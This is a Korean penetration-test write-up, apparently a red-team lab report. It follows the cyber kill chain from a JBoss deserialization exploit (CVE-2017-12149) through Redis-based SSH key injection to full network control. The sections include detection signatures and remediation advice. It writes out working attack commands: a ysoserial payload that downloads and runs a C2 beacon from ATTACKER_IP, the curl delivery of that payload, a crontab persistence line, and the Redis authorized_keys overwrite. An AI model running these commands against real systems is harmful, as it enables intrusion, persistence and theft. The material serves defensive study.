---
layout: post
title: "CyberKillChain-C: 웹 거점 피보팅을 통한 내부 Bastion 및 네트워크 장악 보고서"
date: 2025-11-23 16:00:00 +0900
categories: [penetration-testing, attack-simulation, pivoting, lateral-movement, red-teaming]
---

### **목차**
- [0. 모의 해킹 개요](#0-모의-해킹-개요)
  - [0.1. 목적](#01-목적)
  - [0.2. 방법론](#02-방법론)
  - [0.3. 시스템 아키텍처](#03-시스템-아키텍처)
- [1. 정찰 (Reconnaissance)](#1-정찰-reconnaissance)
- [2. 무기화 (Weaponization)](#2-무기화-weaponization)
- [3. 유포 (Delivery)](#3-유포-delivery)
- [4. 악용 (Exploitation)](#4-악용-exploitation)
- [5. 설치 (Installation)](#5-설치-installation)
- [6. 명령 및 제어 (Command and Control)](#6-명령-및-제어-command-and-control)
- [7. 목적 달성 (Action on Objectives)](#7-목적-달성-action-on-objectives)
  - [7.1. 1단계: 내부 정찰 및 피벗 대상 식별](#71-1단계-내부-정찰-및-피벗-대상-식별)
  - [7.2. 2단계: 내부 피보팅 (Lateral Movement via Redis)](#72-2단계-내부-피보팅-lateral-movement-via-redis)
  - [7.3. 3단계: 거점 이전 및 네트워크 장악](#73-3단계-거점-이전-및-네트워크-장악)
- [8. 종합 분석 및 권고 사항](#8-종합-분석-및-권고-사항)

---

## 0. 모의 해킹 개요

### 0.1. 목적

본 보고서는 `CKCProject` 환경을 대상으로, **제한적인 외부 침투 경로(웹 취약점)를 교두보 삼아 내부의 신뢰받는 관리 경로(Azure Bastion)를 장악**하고, 이를 통해 네트워크 전체의 제어권을 확보하는 고도의 "양동 작전" 시나리오의 결과와 분석을 기술한다. 본 모의 해킹의 목적은 공격자가 초기 거점의 한계를 극복하고 내부 네트워크의 신뢰 관계를 악용하여 어떻게 공격 표면을 확장하고 제어권을 강화하는지를 증명하는 데 있다.

### 0.2. 방법론

본 모의 해킹은 사이버 킬체인 방법론을 따르되, 특히 '목적 달성(Action on Objectives)' 단계를 여러 하위 단계로 나누어 **내부 피보팅(Internal Pivoting)**과 **거점 이전(Foothold Migration)** 과정을 집중적으로 분석한다. 모든 공격 행위는 MITRE ATT&CK® 프레임워크에 매핑되었다.

### 0.3. 시스템 아키텍처

테스트 대상 환경의 아키텍처는 이전 시나리오와 동일하며, 본 시나리오는 Load Balancer를 통해 웹 티어에 진입한 후, 내부에서 Azure Bastion 관리 경로를 탈취하는 복합적인 경로를 따른다.

```mermaid
graph LR
    Attacker[Operator (PC)] -- "1. Exploit (JBoss)" --> WebVM[Web Server (JBoss)]
    WebVM -- "2. Pivot (Redis)" --> Redis[Redis Server (Internal)]
    Redis -- "3. Overwrite SSH Key" --> AttackerAccount[Attacker Account]
    AttackerAccount -- "4. Full Control" --> WebVM
    WebVM -- "5. Lateral Movement" --> DBVM[DB Server]
    WebVM -- "C2 Tunnel" --> C2Server[Attacker C2 Server]
```

---

## 1. 정찰 (Reconnaissance)

**목표:** 외부에서 접근 가능한 자산을 식별하고, 직접적인 원격 코드 실행이 가능한 고위험 침투 지점을 파악.

#### 실행 및 분석

시나리오 A와 달리, 단순 웹 취약점을 넘어 엔터프라이즈급 애플리케이션을 공략 대상으로 삼고 정찰을 수행했다.

**1. [T1595.001] Active Scanning**

`nmap`을 사용하여 로드 밸런서 뒤에 숨겨진 서비스 포트를 식별했다.

```bash
# nmap -sV -p- --version-intensity 9 -T4 -Pn LOAD_BALANCER_IP
Starting Nmap 7.94 ( https://nmap.org )
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.29
8080/tcp open  http       Apache Tomcat 9.0.58
8082/tcp open  http       WildFly 10.1.0.Final (JBoss)
```

**2. [T1594] Search Victim-Owned Websites**

식별된 `WildFly 10.1.0.Final` 버전은 **인증 없는 역직렬화 원격 코드 실행 취약점(CVE-2017-12149)**에 취약한 것으로 확인되었다. `/invoker/JNDIFactory` 엔드포인트가 외부에 노출되어 있었다.

> **[스크린샷 1 위치: nmap 스캔 결과 8082/tcp 포트에서 JBoss/Wildfly 서비스가 식별된 터미널 화면]**

**결론:** 이 단계에서 공격자는 웹 셸 업로드와 같은 다단계 과정이 필요 없는, 직접적인 RCE가 가능한 치명적인 침투 경로를 확보했다.

#### 탐지 서명 (Detection Signatures)

*   **Network:**
    *   **Signature:** 외부 IP에서 `8082`, `8009` (AJP) 등 JBoss 관련 관리 포트로의 연결 시도.
    *   **Signature:** `/invoker/JNDIFactory`, `/invoker/EJBInvokerServlet` 등 취약한 엔드포인트에 대한 HTTP GET/POST 요청.

---

## 2. 무기화 (Weaponization)

**목표:** 식별된 JBoss 역직렬화 취약점을 공략하여 C2 세션을 획득할 수 있는 맞춤형 페이로드를 제작.

#### 실행 및 분석

**1. [T1588.002] Obtain Capabilities: Tool**

공개된 Java 역직렬화 페이로드 생성 도구(`ysoserial`)와 C2 프레임워크(Sliver)를 활용했다.

**2. [T1608.005] Stage Capabilities: C2 Channel**

1.  **C2 Beacon 생성:** Sliver를 사용하여 대상 시스템(Linux/amd64)에서 실행될 C2 Beacon(`genesis_c.elf`)을 제작했다.
2.  **역직렬화 페이로드 제작:** `ysoserial`을 사용하여, 실행 시 C2 Beacon을 다운로드하고 실행하는 셸 명령어를 트리거하는 직렬화된 Java 객체 페이로드(`payload.ser`)를 생성했다.

```bash
# Generate malicious serialized object
java -jar ysoserial.jar CommonsCollections5 "wget http://ATTACKER_IP:8000/genesis_c.elf -O /tmp/g.elf; chmod +x /tmp/g.elf; /tmp/g.elf" > payload.ser
```

**결론:** JBoss 서버가 처리하는 순간 원격 코드 실행을 유발하는 정교한 '원샷' 무기가 준비되었다.

---

## 3. 유포 (Delivery)

**목표:** 제작된 악성 역직렬화 페이로드를 취약한 JBoss 애플리케이션 엔드포인트에 전달.

#### 실행 및 분석

**1. [T1190] Exploit Public-Facing Application**

`curl`을 사용하여 제작된 악성 페이로드(`payload.ser`)를 JBoss의 취약한 `/invoker/JNDIFactory` 엔드포인트로 전송했다. 이 요청의 HTTP Body에 담긴 악성 페이로드는 JBoss 서버에 도달하여 처리 대기 상태가 된다.

```bash
# Send payload to vulnerable endpoint
$ curl http://LOAD_BALANCER_IP:8082/invoker/JNDIFactory --data-binary @payload.ser
```

> **[스크린샷 2 위치: curl 명령어를 통해 악성 payload.ser 파일을 JBoss 서버로 전송하는 터미널 화면]**

**결론:** 공격 페이로드가 성공적으로 목표 시스템의 애플리케이션 처리 큐 내부에 전달되었다.

#### 탐지 서명 (Detection Signatures)

*   **Network (IDS/WAF):**
    *   **Signature:** HTTP Body에 Java 직렬화 매직 바이트(`AC ED 00 05`)가 포함된 요청.
    *   **Signature:** Content-Type이 `application/x-java-serialized-object`인 요청.

---

## 4. 악용 (Exploitation)

**목표:** JBoss 서버가 유포된 악성 페이로드를 역직렬화하도록 하여, 원격 코드 실행을 트리거하고 초기 접근 권한을 획득.

#### 실행 및 분석

**1. [T1210] Exploitation of Remote Services**

JBoss 서버가 `payload.ser`를 처리(역직렬화)하는 순간, 내부에 포함된 악성 코드가 서버의 컨텍스트에서 실행되었다.

**2. [T1059.004] Command and Scripting Interpreter: Unix Shell**

페이로드에 포함된 `wget` 및 `chmod` 명령어가 실행되어, C2 Beacon이 다운로드 및 실행되었다.

**결론:** 웹 셸과 같은 중간 과정 없이, JBoss 애플리케이션의 취약점을 직접 악용하여 시스템에 대한 원격 코드 실행 권한을 획득하는 데 성공했다.

---

## 5. 설치 (Installation)

**목표:** 악용 단계를 통해 실행된 일회성 C2 Beacon을, 시스템 재부팅 후에도 살아남는 영구적인 백도어로 전환.

#### 실행 및 분석

**1. [T1053.003] Scheduled Task/Job: Cron**

악용 성공 직후 생성된 임시 C2 세션을 통해, 현재 사용자(`jboss` 또는 `wildfly`)의 `crontab`에 C2 Beacon을 재실행하는 구문을 등록했다.

```bash
# Execute via Sliver session (jboss user)
$ (crontab -l 2>/dev/null; echo "* * * * * /tmp/g.elf") | crontab -
```

**결론:** 초기 침투를 통해 확보한 접근 경로에 지속성을 부여하여, 안정적인 후속 공격 기반을 마련했다.

---

## 6. 명령 및 제어 (Command and Control)

**목표:** C2 Beacon을 통해 공격자의 서버와 안정적인 통신 채널을 수립하고, 제한적인 초기 거점을 확보.

#### 실행 및 분석

**1. [T1071.001] Application Layer Protocol: Web Protocols**

실행된 C2 Beacon이 NAT Gateway를 통해 C2 서버로 콜백하여 **`jboss` 권한의 초기 세션(`INITIAL_JBOSS_SESSION`)**이 생성되었다. 이 세션은 권한이 제한적이며(`uid=1001(jboss)`), 프로세스 불안정성으로 인해 언제든 끊길 수 있는 상태이다.

```bash
sliver > sessions
 ID          Transport   Remote Address       Hostname    Username   Operating System
==========  =========== ==================== =========== ========== ==================
 2b3c4d5e    mtls        20.x.x.x:51234       web-vm-01   jboss      linux/amd64
```

> **[스크린샷 3 위치: Sliver C2 서버에 jboss 사용자로 INITIAL_JBOSS_SESSION이 생성된 화면]**

**결론:** 이 불안정한 거점은 최종 목표가 아닌, 다음 공격을 위한 **전술적 교두보**로 활용되었다.

---

## 7. 목적 달성 (Action on Objectives)

**목표:** 제한된 JBoss 거점을 활용하여 내부 네트워크를 장악하고 최종 목표를 달성하는 다단계 과정.

### 7.1. 1단계: 내부 정찰 및 피벗 대상 식별

**목표:** JBoss 거점에서 내부 네트워크 정보를 수집하고, 더 나은 공격 경로(피벗 대상)를 식별.

#### 실행 및 분석

`INITIAL_JBOSS_SESSION`을 통해 내부망 스캔을 수행했다.

**1. [T1046] Network Service Scanning**

```bash
sliver (WEB-VM-01) > shell
$ nmap -p 6379 10.42.3.0/24
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for 10.42.3.15
Host is up (0.00042s latency).
PORT     STATE SERVICE
6379/tcp open  redis
```

**2. [T1083] File and Directory Discovery**

```bash
$ ls -la /home
drwxr-xr-x 4 attacker attacker 4096 Nov 21 10:00 attacker
drwxr-xr-x 2 jboss    jboss    4096 Nov 21 10:00 jboss
```

**분석:** 외부에서는 보이지 않던 **인증 없는 Redis 서버(`10.42.3.15:6379`)**가 내부망에 노출되어 있으며, 시스템에 `attacker`라는 관리자 계정이 존재함을 확인했다.

> **[스크린샷 4: nmap 스캔 결과 6379/tcp open redis가 식별된 터미널 화면]**

### 7.2. 2단계: 내부 피보팅 (Lateral Movement via Redis)

**목표:** `jboss` 권한에서 Redis 서버를 악용하여 `attacker` 관리자 계정의 제어권을 탈취.

#### 실행 및 분석

`root` 권한 없이, 내부 서비스 간의 신뢰 관계와 설정 오류를 이용하는 정교한 수평 이동을 수행했다.

**1. [T1021.007] Cloud Services & [T1550] Use Alternate Authentication Material**

Redis의 `config set` 명령어를 악용하여, 공격자의 SSH 공개 키를 `attacker` 사용자의 `authorized_keys` 파일에 덮어썼다.

```bash
# 1. Generate SSH key pair on attacker machine
$ ssh-keygen -t rsa -f attacker_key -N ""
$ (echo -e "\n\n"; cat attacker_key.pub; echo -e "\n\n") > payload.txt

# 2. Write public key to Redis memory
$ cat payload.txt | redis-cli -h 10.42.3.15 -x set attacker_ssh_key

# 3. Configure Redis to write file to attacker's SSH directory
$ redis-cli -h 10.42.3.15 config set dir /home/attacker/.ssh/
OK
$ redis-cli -h 10.42.3.15 config set dbfilename "authorized_keys"
OK

# 4. Trigger save to write the file
$ redis-cli -h 10.42.3.15 save
OK
```

> **[스크린샷 5: redis-cli를 이용해 attacker의 authorized_keys 파일을 덮어쓰는 일련의 명령어 실행 화면]**

**결론:** 인증이 없는 내부 Redis 서비스를 이용하여, 파일 시스템 쓰기 권한을 획득하고 SSH 접근 권한을 강제로 부여했다.

#### 탐지 서명 (Detection Signatures)

*   **Network:**
    *   **Signature:** 내부망에서 Redis 기본 포트(6379)로의 비정상적인 연결 트래픽.
*   **Application (Redis Logs):**
    *   **Signature:** `CONFIG SET dir`, `CONFIG SET dbfilename` 명령어가 실행된 로그.

### 7.3. 3단계: 거점 이전 및 네트워크 장악

**목표:** 불안정한 초기 거점을 버리고, 탈취한 관리자 권한으로 안정적인 새 거점을 구축하여 네트워크를 완전히 장악.

#### 실행 및 분석

**1. [T1021.004] Remote Services: SSH**

Redis 공격 성공 후, `jboss` 세션에서 공격자 자신의 개인 키를 사용하여 `attacker` 계정으로 SSH 접속에 성공했다.

```bash
$ ssh -i ./attacker_key attacker@localhost
Welcome to Ubuntu...
attacker@web-vm-01:~$ id
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),999(docker),27(sudo)
```

**2. 거점 이전 (Foothold Migration)**

`attacker` 권한을 획득한 셸에서, 새로운 C2 Beacon(`stable_c.elf`)을 설치했다. Sliver 클라이언트에 **안정 세션(`STABLE_ATTACKER_SESSION`)**이 생성되자, 추적을 피하기 위해 기존 `INITIAL_JBOSS_SESSION`은 즉시 종료시켰다.

> **[스크린샷 6: Sliver C2에 attacker 사용자로 STABLE_ATTACKER_SESSION이 새로 생성되고, 기존 jboss 세션은 사라진 화면]**

**3. [T1005] Data from Local System**

`attacker` 계정은 `sudo` 권한과 `docker` 권한을 모두 가지고 있어, 사실상 시스템의 모든 통제권을 확보했다. 이후 DB 서버로의 수평 이동 및 데이터 유출은 시나리오 B와 동일하게 진행되었다.

#### 탐지 서명 (Detection Signatures)

*   **Endpoint (Auditd):**
    *   **Signature:** `authorized_keys` 파일이 `redis-server` 프로세스에 의해 수정됨.
    *   **Signature:** 로컬호스트(127.0.0.1)에서 SSH 로그인 성공 이벤트 발생.

---

## 8. 종합 분석 및 권고 사항 (Comprehensive Analysis and Recommendations)

### 8.1. 종합 분석: 레거시 시스템과 내부망 보안의 부재

본 시나리오는 외부 엔터프라이즈 앱 취약점으로 시작하여, 내부 서비스의 설정 오류를 교묘하게 이용해 관리자 권한을 탈취하는, 고도로 숙련된 공격자의 현실적인 침투 과정을 보여준다.

*   **문제점 1: 레거시 시스템 방치 (Legacy System Neglect)**
    *   **분석:** JBoss(WildFly 10)와 같이 더 이상 보안 업데이트가 지원되지 않거나(EOL), 알려진 취약점이 있는 구형 소프트웨어를 운영하는 것은 공격자에게 활짝 열린 문을 제공하는 것과 같다.
*   **문제점 2: 내부망 세그멘테이션 부재 (Lack of Segmentation)**
    *   **분석:** 웹 서버(JBoss)가 내부의 Redis 서버에 아무런 제약 없이 접근할 수 있었다. "내부망은 안전하다"는 잘못된 가정 하에, 서비스 간의 통신을 통제하지 않은 것이 피보팅을 허용했다.
*   **문제점 3: 내부 서비스 인증 미흡 (Weak Internal Authentication)**
    *   **분석:** Redis와 같은 데이터 저장소가 인증 없이 운영되고 있었으며, 심지어 파일 시스템에 임의의 파일을 쓸 수 있는 위험한 설정이 활성화되어 있었다.

### 8.2. 보안 강화 로드맵: 단계별 개선 방안

#### [긴급] 즉시 조치 사항 (24시간 내 수행 권고)

1.  **JBoss/WildFly 긴급 패치:**
    *   취약한 JBoss 서버를 최신 버전으로 업그레이드하거나, 불가능할 경우 WAF를 통해 `/invoker/*` 경로에 대한 접근을 원천 차단한다.
2.  **Redis 보안 설정 강화:**
    *   Redis 설정 파일(`redis.conf`)에서 `requirepass`를 설정하여 인증을 강제하고, `rename-command CONFIG ""` 설정을 통해 위험한 명령어(`CONFIG`, `SAVE` 등)의 실행을 비활성화한다.

#### [중기] 인프라 방어 강화 (3개월 내 수행 권고)

1.  **내부망 접근 통제(ACL) 강화:**
    *   NSG(Network Security Group)를 이용하여 웹 서버가 Redis 서버의 포트(6379)에 접근하는 것을 필요한 경우에만 허용하고, 그 외의 모든 내부 통신은 차단한다.
2.  **파일 무결성 모니터링 (FIM):**
    *   `authorized_keys`와 같은 중요 시스템 설정 파일에 대한 변경 사항을 실시간으로 감지하고 경고하는 FIM 솔루션을 도입한다.

#### [장기] 지속 가능한 보안 체계 구축 (1년 내 구축 목표)

1.  **마이크로 세그멘테이션 (Micro-segmentation):**
    *   컨테이너 또는 VM 단위로 세분화된 보안 정책을 적용하여, 하나의 서비스가 침해되더라도 인접한 다른 서비스로 공격이 확산되는 것을 기술적으로 차단한다.
